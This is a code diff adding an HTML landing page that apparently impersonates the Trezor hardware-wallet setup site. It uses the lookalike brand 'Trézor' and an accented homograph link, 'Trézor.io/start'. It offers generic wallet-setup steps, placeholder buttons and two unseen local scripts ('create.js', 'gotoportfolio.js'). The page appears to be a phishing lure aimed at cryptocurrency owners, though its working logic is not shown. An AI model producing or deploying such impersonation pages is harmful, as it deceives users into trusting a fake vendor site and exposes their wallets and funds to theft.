@@ -1,0 +1,631 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Trézor.io/start® | Starting Up Your Device | Trézor®</title>
+    <meta name="description"
+        content="Explore Trézor.io/start for safe crypto management. Trade, send, and receive securely while getting price alerts. Protect your assets with trusted security solutions today.">
+    <meta name="keywords" content="Trézor.io/start, Trézor suite, hardware wallet, bridge, login, app">
+    <link rel="icon" href="https://i.ibb.co/nMw3vBv/Trézor-Wallet-logo-1-Copy-Copy.png">
+
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
+
+    <!-- Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap"
+        rel="stylesheet">
+
+    <style>
+        body {
+            font-family: "Montserrat", serif;
+            background-color: #f6f6f6 !important;
+        }
+
+
+        :root {
+            --primary-color: #0f6148;
+        }
+
+        .bg-sec {
+            background-color: #0f6148;
+            border-radius: 20px;
+        }
+
+        /* Top Line */
+
+        .top-line {
+            background-color: rgb(0, 133, 77);
+        }
+
+        .top-line p {
+            text-align: center;
+            color: #fff;
+            padding: 8px 20px;
+        }
+
+        .top-line p a {
+            color: #fff;
+            font-weight: 500;
+        }
+
+        /* Navbar */
+
+        .nav-logo {
+            font-size: 22px !important;
+            font-weight: 800 !important;
+        }
+
+        .nav-box {
+            display: flex;
+            gap: 20px;
+            justify-content: space-between;
+            align-items: center;
+            position: fixed !important;
+            top: 50px;
+            width: 92%;
+            z-index: 9999;
+        }
+
+        .nav-menu {
+            background-color: #fff;
+            width: 100%;
+            border-radius: 100px;
+            padding: 20px 30px;
+            display: flex;
+            justify-content: space-between;
+            box-shadow: rgba(0, 0, 0, 0.1) -4px 9px 25px -6px;
+        }
+
+        .nav-icon {
+            background-color: var(--primary-color);
+            padding: 20px 21px;
+            width: 15%;
+            border-radius: 100px;
+            text-align: center;
+        }
+
+        .nav-icon a {
+            color: #fff;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+
+        .nav-opts {
+            display: flex;
+        }
+
+        .nav-opts p {
+            margin: 0px 20px 0px 0px;
+            font-weight: 500;
+            color: #777;
+        }
+
+        .nav-opts p span {
+            background-color: #eee;
+            color: #777;
+            margin-left: 4px;
+        }
+
+        .nav-opts svg {
+            color: #777;
+        }
+
+        .country img {
+            width: 20px;
+        }
+
+        .currency {
+            border-right: 2px solid #ccc;
+            padding-right: 20px;
+        }
+
+        .nav-menu-opts a {
+            color: #777;
+            margin: 0px 15px;
+            text-decoration: none;
+        }
+
+
+        /* Banner */
+
+        .banner {
+            height: 80vh;
+        }
+
+        .banner-cntnt h1 {
+            font-weight: 600;
+
+            color: var(--primary-color);
+            font-size: 72px;
+        }
+
+        .banner-cntnt h1 span {
+            color: var(--primary-color);
+        }
+
+        .banner-cntnt p {
+            color: #111;
+            font-size: 22px;
+            margin-bottom: 30px;
+        }
+
+        .btn-new {
+            background-color: var(--primary-color);
+            padding: 12px 25px;
+            display: inline-block;
+            color: #f6f6f6;
+            text-decoration: none;
+            border-radius: 30px;
+            font-weight: 600;
+            margin-right: 10px;
+            font-size: 17px;
+            transition: all .3s;
+        }
+
+        .btn-new:hover {
+            background-color: #032e21;
+            color: #f6f6f6;
+            text-decoration: none;
+        }
+
+        .btn-new-2 {
+            background-color: #ddd !important;
+            padding: 12px 25px;
+            display: inline-block;
+            color: #000 !important;
+            text-decoration: none !important;
+            border-radius: 30px;
+            font-weight: 600;
+            margin-right: 20px;
+            font-size: 17px;
+            transition: all .3s;
+        }
+
+        .btn-new-2:hover {
+            background-color: #ccc !important;
+        }
+
+        .btn-text {
+            padding: 12px 0px;
+            display: inline-block;
+            color: #555 !important;
+            border-radius: 30px;
+            font-weight: 400;
+            margin-right: 20px;
+            font-size: 17px;
+        }
+
+        .btn-text:hover {
+            text-decoration: none;
+        }
+
+        .banner-cntnt>span {
+            display: block;
+            padding-top: 20px;
+            font-size: 16px;
+            color: #555;
+        }
+
+        .vh-75 {
+            height: 80vh;
+        }
+
+        .c-box {
+            background-color: #fff;
+            border-radius: 20px;
+            padding: 50px !important;
+        }
+
+        .heading h2 {
+            font-size: 36px;
+            margin-bottom: 30px;
+            font-weight: 900;
+        }
+
+        .heading h2 {
+            border-top: 1px solid #ccc;
+            padding-top: 30px;
+        }
+
+        .heading h2:first-child {
+            border: none;
+        }
+
+        .heading p {
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        li {
+            margin-bottom: 15px;
+        }
+
+        footer {
+            background-color: #171717;
+        }
+
+        .f-one svg {
+            color: #fff;
+            width: 150px;
+            margin-bottom: 10px;
+        }
+
+        .f-one p {
+            color: #aaa;
+            font-size: 14px;
+        }
+
+        .f-two h6 {
+            font-size: 16px;
+            color: #ddd;
+            margin-bottom: 20px;
+        }
+
+        .f-two a {
+            display: block;
+            color: #fff;
+            text-decoration: none;
+            margin-bottom: 10px;
+        }
+
+        .f-two a:hover {
+            color: #aaa;
+        }
+
+        .social {
+            margin-top: 20px;
+        }
+
+        .social a svg {
+            width: 24px;
+            color: #fff;
+        }
+
+        .social a {
+            color: unset;
+            text-decoration: none;
+            margin: 0px 10px;
+        }
+
+        .last-line {
+            background-color: #1f1f1f;
+            color: #aaa;
+        }
+
+        .last-line p {
+            margin-bottom: 0px;
+            font-size: 14px;
+        }
+
+        .last-line a {
+            color: #aaa;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .st-two h2 span {
+            display: block;
+        }
+
+        .ri {
+            display: none;
+        }
+
+        .gti {
+            display: none;
+        }
+
+        @media screen and (max-width:700px) {
+
+            .heading h2 {
+                font-size: 32px;
+            }
+
+            .heading h2 span svg {
+                display: none;
+            }
+
+            .banner {
+                height: unset;
+            }
+
+            .banner-cntnt h1 {
+                font-size: 32px;
+                font-weight: 700;
+            }
+
+            .banner-cntnt p {
+                font-size: 16px;
+            }
+
+            .banner-cntnt a {
+                display: block;
+                margin: 0px;
+            }
+
+            .top-line p {
+                font-size: 14px;
+            }
+
+            .c-box {
+                padding: 50px 30px !important;
+            }
+
+            .so {
+                padding: 20px;
+            }
+
+            .so-head p {
+                font-size: 18px;
+            }
+
+            .heading2 h2 {
+                font-size: 32px;
+                font-weight: 700;
+            }
+
+            .st-one {
+                height: 300px;
+            }
+
+            .st-two h2 {
+                font-size: 28px;
+            }
+
+            .st-two h2 span {
+                display: unset;
+            }
+
+            .st-two ul {
+                margin-bottom: 20px;
+            }
+
+            .f-two {
+                margin-bottom: 50px;
+            }
+
+            .f-one {
+                margin-bottom: 50px;
+            }
+
+            .social a {
+                display: inline-block;
+                margin-bottom: 20px;
+            }
+
+            .last-line p {
+                margin-bottom: 20px;
+            }
+
+            .nav-menu-opts {
+                display: none;
+            }
+
+            .country,
+            .currency {
+                display: none;
+            }
+
+            .ri {
+                display: block;
+            }
+
+            .nav-logo img {
+                width: 80px;
+            }
+
+            .nav-menu {
+                padding: 15px 15px;
+            }
+
+            .nav-icon {
+                display: none;
+            }
+
+        }
+    </style>
+
+</head>
+
+<body>
+
+    <div class="top-line">
+        <p><a href="#">Download Now</a></p>
+    </div>
+
+    <!-- Banner -->
+    <section class="banner py-5 py-md-0">
+        <div class="container-fluid">
+            <div class="row align-items-center px-3 px-md-5">
+                <div class="col-md-12 px-0 px-md-1 p-relative">
+                    <div class="nav-box mb-4">
+                        <div class="nav-menu">
+                            <div class="nav-logo">
+                                Trézor
+                            </div>
+                            <div class="nav-menu-opts">
+                                <a href="#">Products</a>
+                                <a href="#">App</a>
+                                <a href="#">Coins</a>
+                                <a href="#">Learn & Support</a>
+                            </div>
+                            <div class="nav-opts">
+                                <p>Cart <span class="badge rounded-circle">0</span></p>
+                            </div>
+                        </div>
+                        <div class="nav-icon">
+                            <a href="#" class="gt">Download</a>
+                        </div>
+                    </div>
+                    <!-- Navbar End -->
+
+                </div>
+                <div class="col-md-12 py-md-5">
+                    <div class="banner-cntnt pt-5">
+                        <h1 class="pt-5">Start with New Trézor</h1>
+                        <p>Secure your coins with Trézor</p>
+                        <a href="#" class="btn-new mb-2 mb-md-4">Get Started</a>
+                        <a href="#" class="btn-new-2">Continue in browser</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    <!-- Banner End -->
+
+    <!-- Section -->
+
+    <div class="bg-section mb-5">
+        <div class="container c-box">
+            <div class="row">
+                <div class="col-md-12">
+                    <div class="heading">
+                        <h2>Beginner’s Guide to Setting Up Your Trézor Wallet</h2>
+                        <p>Navigate to <strong>Trézor.io/start</strong> to configure your new Trézor device safely and
+                            efficiently.</p>
+                        </header>
+
+                        <section>
+                            <h3>Why Opt for a Trézor Hardware Wallet?</h3>
+                            <ul>
+                                <li><strong>High-Level Security:</strong> Keeps your private keys safe from online
+                                    threats.</li>
+                                <li><strong>Simple User Experience:</strong> The setup is straightforward and easy to
+                                    follow.</li>
+                                <li><strong>Wide Crypto Support:</strong> Manage Bitcoin, Ethereum, and thousands of
+                                    other cryptocurrencies.</li>
+                                <li><strong>Recovery Features:</strong> Easily back up and restore your wallet if
+                                    needed.</li>
+                            </ul>
+                        </section>
+
+                        <section>
+                            <h2>Step-by-Step Instructions for Setting Up via Trézor.io/start</h2>
+
+                            <h3>Step 1: Open Trézor.io/start</h3>
+                            <p>Plug your Trézor wallet into your device using a USB cable. Then, launch your browser and
+                                head to <a href="https://Trézor.io/start" target="_blank">Trézor.io/start</a>.</p>
+
+                            <h3>Step 2: Download Trézor Suite</h3>
+                            <p>Trézor Suite is the official desktop app to securely manage your crypto holdings.
+                                Download the correct version for Windows, macOS, or Linux from the official site.</p>
+
+                            <h3>Step 3: Start the Device Setup</h3>
+                            <ol>
+                                <li>Launch Trézor Suite after installation.</li>
+                                <li>Select <strong>“Create a New Wallet”</strong> if you're using a new device.</li>
+                                <li>Update firmware if prompted, then continue with the instructions.</li>
+                            </ol>
+
+                            <h3>Step 4: Write Down Your Recovery Seed</h3>
+                            <p>The device will generate a seed phrase of 12 to 24 words. This is vital for wallet
+                                recovery. Follow these precautions:</p>
+                            <ul>
+                                <li>Write the seed on paper and keep it in a secure location.</li>
+                                <li>Do not store it online or on any digital medium.</li>
+                                <li>Never disclose the phrase to anyone.</li>
+                            </ul>
+
+                            <h3>Step 5: Set a Secure PIN</h3>
+                            <p>Create a strong PIN on your Trézor device. This acts as an added layer of protection
+                                against unauthorized access.</p>
+
+                            <h3>Step 6: Add Cryptocurrencies</h3>
+                            <p>Once your wallet is active, you can start adding crypto assets. Use Trézor Suite to pick
+                                your preferred cryptocurrencies, generate wallet addresses, and begin managing your
+                                portfolio.</p>
+                        </section>
+
+                        <section>
+                            <h2>Advantages of Using Trézor.io/start</h2>
+                            <ul>
+                                <li><strong>Trusted Official Setup:</strong> Follow verified instructions for secure
+                                    installation.</li>
+                                <li><strong>Top-Tier Security Features:</strong> Defends against phishing and hacking
+                                    attempts.</li>
+                                <li><strong>Beginner-Friendly:</strong> Clear steps for all user levels.</li>
+                            </ul>
+                        </section>
+                            <h2>Final Thoughts</h2>
+                            <p>By setting up your wallet through <a href="https://Trézor.io/start"
+                                    target="_blank">Trézor.io/start</a>, you’re taking a major step toward safeguarding
+                                your digital wealth. Follow the setup carefully and enjoy peace of mind knowing your
+                                assets are protected.</p>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section End -->
+
+    <!-- Footer -->
+
+    <footer class="p-5">
+        <div class="container">
+            <div class="row justify-content-center">
+                <div class="col-md-3">
+                    <div class="f-one">
+                        <svg viewBox="0 0 161.768 40.771" fill="none" class="h-12 w-40" data-testid="@icon/TrézorLogo">
+                            <path class="Trézor-logo-Trézor" fill="currentColor"
+                                d="M24.306 9.461C24.306 4.29 19.761 0 14.228 0 8.694 0 4.148 4.292 4.148 9.46v3.025H0v21.75l14.225 6.536 14.233-6.534V12.581H24.31l-.003-3.121Zm-15.02 0c0-2.438 2.175-4.389 4.942-4.389 2.767 0 4.94 1.951 4.94 4.389v3.024H9.287V9.461Zm13.44 21.264-8.502 3.904-8.499-3.901V17.655h17v13.07z">
+                            </path>
+                            <path class="Trézor-logo-text" fill="currentColor"
+                                d="M40.019 12.485h17.886v5.17h-6.127v16.678h-5.731V17.655h-6.028ZM78.46 19.8c0-4.39-3.064-7.218-7.609-7.218H60.474v21.75h5.732v-7.314h2.174l4.051 7.314h6.627l-4.842-8.094c2.07-.78 4.244-2.83 4.244-6.438zm-8.296 2.146h-3.958v-4.39h3.953c1.482 0 2.47.879 2.47 2.147 0 1.365-.988 2.243-2.47 2.243zm10.963-9.461h16.009v5.072H86.858v3.219h9.982v4.974h-9.982v3.51h10.278v5.073H81.127Zm48.125-.294c-6.719 0-11.46 4.78-11.46 11.218 0 6.437 4.839 11.22 11.46 11.22s11.562-4.779 11.562-11.217c0-6.438-4.842-11.22-11.562-11.22zm0 17.363c-3.359 0-5.633-2.536-5.633-6.14 0-3.707 2.274-6.142 5.633-6.142 3.36 0 5.732 2.537 5.732 6.141 0 3.605-2.372 6.14-5.732 6.14zm27.67-3.316c2.074-.78 4.25-2.83 4.25-6.438 0-4.39-3.064-7.218-7.61-7.218h-10.375v21.75h5.731v-7.314h2.178l4.051 7.314h6.621zm-4.052-4.292h-3.952v-4.39h3.952c1.484 0 2.471.879 2.471 2.147 0 1.365-.987 2.243-2.471 2.243zm-52.967-9.461h16.898v4.389l-9.19 12.29h9.19v5.169H99.903v-4.39l9.19-12.288h-9.19z">
+                            </path>
+                        </svg>
+                    </div>
+                </div>
+
+                <div class="col-md-3">
+                    <div class="f-two">
+                        <h6>Products</h6>
+                        <a href="#">Supported coins</a>
+                        <a href="#">Blog</a>
+                        <a href="#">Privacy and Security</a>
+                        <a href="#">About us</a>
+                    </div>
+                </div>
+                <div class="col-md-3">
+                    <div class="f-two">
+                        <h6>Products</h6>
+                        <a href="#">FAQs</a>
+                        <a href="#">Terms of Use</a>
+                        <a href="#">Affiliate Program</a>
+                        <a href="#">Reseller Program</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </footer>
+    <div class="last-line px-5 py-3">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-12 text-center">
+                    <p>Copyright belongs to company s.r.o. All rights reserved.</p>
+                </div>
+
+            </div>
+        </div>
+    </div>
+    <!-- Footer End -->
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"
+        integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz"
+        crossorigin="anonymous"></script>
+
+
+    <script src="js/create.js"></script>
+    <script src="js/gotoportfolio.js"></script>
+
+
+</body>
+
+</html>
